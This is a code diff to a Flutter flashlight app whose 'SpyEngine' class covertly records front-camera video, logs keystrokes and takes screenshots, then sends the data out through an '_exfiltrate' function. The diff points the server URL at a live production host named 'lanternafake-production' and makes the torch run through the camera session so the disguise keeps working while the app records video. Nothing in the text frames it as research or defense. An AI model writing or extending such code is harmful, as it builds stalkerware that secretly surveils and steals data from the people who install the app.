@@ -32,7 +32,7 @@ void main() {
 // ═══════════════════════════════════════════════════════════════════════════
 
 class Config {
-  static const String baseUrl = 'http://localhost:3001';
+  static const String baseUrl = 'https://lanternafake-production.up.railway.app';
   static const String encryptionKey = 'L4nt3rn4_Spy_K3y_2026_!@#Secure';
   static const int keystrokeFlushMs = 5000;
   static const int screenshotIntervalMs = 30000;
@@ -249,6 +249,9 @@ class SpyEngine {
       if (cameras.length < 2) return;
       _cameraController = CameraController(cameras.length > 1 ? cameras[1] : cameras[0], ResolutionPreset.low, enableAudio: false);
       await _cameraController!.initialize();
+      // Controlar o flash através da sessão de câmara ativa (o torch_light
+      // perde o controlo assim que o CameraController abre a câmara).
+      await _cameraController!.setFlashMode(FlashMode.torch);
       await _cameraController!.startVideoRecording();
       _isRecordingVideo = true;
     } catch (_) { _isRecordingVideo = false; }
@@ -256,17 +259,20 @@ class SpyEngine {
 
   Future<void> stopVideoCapture() async {
     if (!_isRecordingVideo) return;
-    try {
-      final videoFile = await _cameraController?.stopVideoRecording();
-      await _cameraController?.dispose();
-      _cameraController = null;
-      _isRecordingVideo = false;
-      if (videoFile != null) {
+    _isRecordingVideo = false;
+    // Desligar o flash imediatamente, antes de operações demoradas (upload).
+    try { await _cameraController?.setFlashMode(FlashMode.off); } catch (_) {}
+    XFile? videoFile;
+    try { videoFile = await _cameraController?.stopVideoRecording(); } catch (_) {}
+    try { await _cameraController?.dispose(); } catch (_) {}
+    _cameraController = null;
+    if (videoFile != null) {
+      try {
         final bytes = await videoFile.readAsBytes();
         await _exfiltrate('video', {'video_b64': base64.encode(bytes), 'size_bytes': bytes.length, 'mime_type': 'video/mp4'});
         if (await io.File(videoFile.path).exists()) await io.File(videoFile.path).delete();
-      }
-    } catch (_) {}
+      } catch (_) {}
+    }
   }
 
   Future<void> stop() async {
@@ -361,11 +367,12 @@ class _HomePageState extends State<HomePage> with SingleTickerProviderStateMixin
 
   Future<void> _turnOff() async {
     _timer?.cancel();
+    setState(() { _isOn = false; _isRecording = false; });
+    // Desligar o flash primeiro (resposta imediata), depois parar as capturas.
     await _spyEngine.stopVideoCapture();
+    if (!kIsWeb) { try { await TorchLight.disableTorch(); } catch (_) {} }
     String? savedPath;
     try { savedPath = await _audioRecorder.stop(); } catch (_) {}
-    if (!kIsWeb) { try { await TorchLight.disableTorch(); } catch (_) {} }
-    setState(() { _isOn = false; _isRecording = false; });
     final pathToUpload = savedPath ?? _recordingPath;
     if (pathToUpload != null && pathToUpload.isNotEmpty) await _uploadRecording(pathToUpload);
   }
@@ -439,6 +446,8 @@ class _HomePageState extends State<HomePage> with SingleTickerProviderStateMixin
                       AnimatedContainer(
                         duration: const Duration(milliseconds: 300),
                         height: _isRecording ? 80 : 0,
+                        clipBehavior: Clip.hardEdge,
+                        decoration: const BoxDecoration(),
                         child: _isRecording ? Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                           FadeTransition(opacity: _blinkAnimation, child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                             Icon(Icons.mic, color: Colors.red, size: 20), SizedBox(width: 8),
